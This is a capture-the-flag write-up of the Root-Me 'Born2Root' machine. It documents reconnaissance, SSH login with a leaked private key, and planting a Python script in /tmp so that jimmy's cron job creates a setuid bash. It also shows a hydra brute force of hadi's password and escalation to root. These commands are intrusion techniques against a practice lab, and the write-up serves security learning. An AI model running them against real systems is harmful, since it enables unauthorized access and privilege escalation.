## 1. Reconnaissance

Started with a service scan to identify the attack surface.

```bash
nmap -sV ctf10.root-me.org
```

```
PORT    STATE    SERVICE VERSION
22/tcp  open     ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
25/tcp  filtered smtp
53/tcp  open     domain?
80/tcp  open     http    Apache httpd 2.4.10 ((Debian))
111/tcp open     rpcbind 2-4 (RPC #100000)
```

Key observations:

- Old Debian 8 (Jessie) system — likely vulnerable to known CVEs
- HTTP service running — worth enumerating
- SMTP filtered externally but listening on localhost
- RPCbind exposed — potential NFS

---

## 2. Web Enumeration

Ran a directory scan against the web server.

```bash
gobuster dir -u http://ctf10.root-me.org/ -w common.txt
```

```
/files    (Status: 301)
/icons    (Status: 301)
/robots.txt (Status: 200)
```

Browsing `/icons/` revealed a suspicious `.txt` file. Its contents turned out to be an **RSA private key**.

---

## 3. Initial Foothold — SSH as martin

The main page of the website referenced a user named **martin** as a contact. Combined with the discovered private key, this gave a valid SSH login.

```bash
chmod 600 id_rsa
ssh -i id_rsa martin@ctf10.root-me.org
```

Access granted as `martin` (uid=1001).

---

## 4. Enumeration as martin

### System info

```
Linux debian 3.16.0-4-586 — Debian 8 (Jessie)
```

### Users with shells

```
root, hadi, martin, jimmy
```

### Interesting findings

**`~/.bashrc`** had `/var/tmp/login.py` appended at the end, spawning an interactive password prompt on every shell login — a nuisance bypass requiring `--norc --noprofile`.

**`~/.bash_history`** was very revealing:

- Multiple `su hadi`, `su root` attempts
- References to `/var/tmp/login.py` containing hardcoded passwords (`secretsec`, `secretlab`)
- A file move: `mv VdXAsOKisAOIO.txt.png key.txt.png` pointing to hidden web assets

**`/var/tmp/login.py`** contained:

```python
if (password) == "secretsec" or "secretlab":
```

> Note: this condition is always `True` due to a Python logic bug — `"secretlab"` is a non-empty string and always evaluates to truthy. Neither password worked for privilege escalation.

**`/etc/crontab`** revealed a critical entry:

```
*/5 * * * *   jimmy   python /tmp/sekurity.py
```

Jimmy runs a Python script from `/tmp` every 5 minutes — and `/tmp` is world-writable.

---

## 5. Lateral Movement — martin → jimmy

Since `/tmp/sekurity.py` doesn't exist and `/tmp` is world-writable, we can plant a malicious script and wait for jimmy's cron job to execute it.

```bash
echo 'import os; os.system("cp /bin/bash /tmp/jimmybash; chmod u+s /tmp/jimmybash")' > /tmp/sekurity.py
```

After up to 5 minutes:

```bash
ls -la /tmp/jimmybash
# -rwsr-xr-x 1 jimmy jimmy ...

/tmp/jimmybash --norc --noprofile -p
id
# uid=1001(martin) gid=1001(martin) euid=1002(jimmy)
```

The `--norc --noprofile` flags bypass the `.bashrc` trap that would otherwise intercept the shell.

---

## 6. Privilege Escalation — jimmy → hadi → root

With `euid=jimmy`, `/home/jimmy/` became accessible. After further enumeration, no direct path to root was found from jimmy.

The next target was **hadi**. Reviewing `authorized_keys` in `/home/hadi/.ssh/` confirmed that key-based SSH auth was configured for hadi, but no matching private key was found on the system.

**Brute-forcing hadi's SSH password** with a targeted wordlist:

```bash
hydra -l hadi -P wordlist_hadi.txt ssh://ctf10.root-me.org -t 4
```

```
[22][ssh] host: ctf10.root-me.org   login: hadi   password: hadi123
```

Connected as hadi, then escalated to root:

```bash
su -l
# Password: hadi123 (reused / weak)
```

---

## 7. Root Flag

```
root@debian:~# cat *
```

```
,-----.                         ,---. ,------.                 ,--.
|  |) /_  ,---. ,--.--.,--,--, '.-.  \|  .--. ' ,---.  ,---. ,-'  '-.
|  .-.  \| .-. ||  .--'|      \ .-' .'|  '--'.'| .-. || .-. |'-.  .-'
|  '--' /' '-' '|  |   |  ||  |/   '-.|  |\  \ ' '-' '' '-' '  |  |
`------'  `---' `--'   `--''--''-----'`--' '--' `---'  `---'   `--'

Congratulations! You pwned Born2Root's CTF completely.
```
